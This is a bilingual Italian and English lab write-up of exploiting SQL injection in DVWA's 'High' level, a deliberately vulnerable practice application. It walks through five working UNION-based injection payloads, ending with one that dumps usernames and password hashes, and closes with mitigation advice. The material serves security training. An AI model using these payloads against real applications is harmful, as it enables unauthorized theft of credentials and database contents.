
## SQL Injection – Livello High (Italiano)

## Descrizione

Nel livello "High" di DVWA, l'applicazione presenta un'interfaccia composta da una finestra principale e una secondaria.  
Cliccando su un link, si apre la finestra `session-input.php`, dove è possibile inserire un ID utente. Una volta inviato, la risposta viene visualizzata nella pagina principale con nome e cognome.

Sebbene questo livello implementi un apparente controllo più avanzato, la vulnerabilità SQL Injection è comunque presente e sfruttabile.

## Obiettivo

Esfiltrare dati sensibili dal database, in particolare gli `username` e le `password` memorizzati nella tabella `users`.

## Ambiente di test

- DVWA livello: High  
- Esecuzione su VirtualBox  
- Browser: Firefox  
- Strumenti: Burp Suite (Proxy + Repeater), DevTools

---

## Fasi dell'attacco

### 1. Verifica della vulnerabilità

Nella finestra `session-input.php`, è stato inserito il seguente payload:

```sql
' OR 1=1 #
```

✅ Risultato: nella finestra principale vengono mostrati tutti i 5 nomi e cognomi → confermata la vulnerabilità SQL Injection.

---

### 2. Determinazione del numero di colonne

Payload utilizzato:

```sql
' UNION SELECT NULL, NULL #
```

✅ Il payload è accettato senza errore → la query sottostante restituisce **2 colonne visibili**.

---

### 3. Estrazione delle tabelle

Payload utilizzato:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables #
```

✅ Risultato: vengono mostrate tutte le tabelle, tra cui `users`.

---

### 4. Estrazione delle colonne della tabella `users`

Payload utilizzato:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

✅ Risultato: la query restituisce tutte le colonne della tabella `users`, incluse `user` e `password`.

---

### 5. Esfiltrazione dei dati

Payload utilizzato:

```sql
' UNION SELECT user, password FROM users #
```

✅ Risultato: vengono mostrati a schermo tutti gli **username** e le rispettive **password hashate**.

> ⚠️ I dati estratti non sono riportati nel report per motivi etici.

---

## Considerazioni finali

Nonostante il livello "High" implementi una struttura a due finestre e presumibilmente dei filtri lato server, l’applicazione rimane vulnerabile a SQL Injection.

L’attaccante, con sufficiente comprensione delle query e delle strutture SQL, riesce a bypassare i controlli e accedere a dati sensibili.

---

## Mitigazioni consigliate

### Italiano

Per prevenire questa vulnerabilità, si consiglia:

- Utilizzare **query parametrizzate** (prepared statements)
- Evitare di concatenare direttamente input utente nelle query SQL
- Validare e sanificare accuratamente tutti i dati in ingresso
- Limitare i privilegi dell’utente del database
- Implementare un logging delle richieste sospette

---
---

## SQL Injection – High Level (English)

## Description

In the "High" level of DVWA, the application uses a main window and a secondary popup (`session-input.php`) where the user can insert an ID.  
Once submitted, the response is dynamically displayed in the main page, showing first and last name.

Despite the increased complexity, the application remains vulnerable to SQL Injection.

## Objective

Exfiltrate sensitive data from the database, particularly usernames and hashed passwords from the `users` table.

## Test environment

- DVWA level: High  
- Running on VirtualBox  
- Browser: Firefox  
- Tools: Burp Suite (Proxy + Repeater), DevTools

---

## Attack steps

### 1. Testing for SQL Injection

In the popup window, the following payload was submitted:

```sql
' OR 1=1 #
```

✅ Result: all 5 users’ names were displayed → confirms active SQL Injection.

---

### 2. Determining column count

Payload used:

```sql
' UNION SELECT NULL, NULL #
```

✅ No error → the underlying query uses **2 visible columns**.

---

### 3. Extracting table names

Payload used:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables #
```

✅ Result: list of tables displayed, including `users`.

---

### 4. Extracting column names from `users`

Payload used:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
```

✅ Result: displayed all column names from the `users` table, including `user` and `password`.

---

### 5. Extracting data

Payload used:

```sql
' UNION SELECT user, password FROM users #
```

✅ Result: all usernames and hashed passwords were displayed successfully.

> ⚠️ Extracted data is intentionally omitted for ethical reasons.

---

## Final thoughts

Even with structural changes and assumed sanitization in the High level, SQL Injection remains exploitable.  
An attacker with SQL knowledge can bypass controls and retrieve sensitive data.

---

## Recommended mitigation

### English

To prevent this vulnerability:

- Use **parameterized queries** (prepared statements)  
- Never concatenate user input directly into SQL queries  
- Always validate and sanitize incoming data  
- Limit database user privileges  
- Implement logging and monitoring for suspicious requests

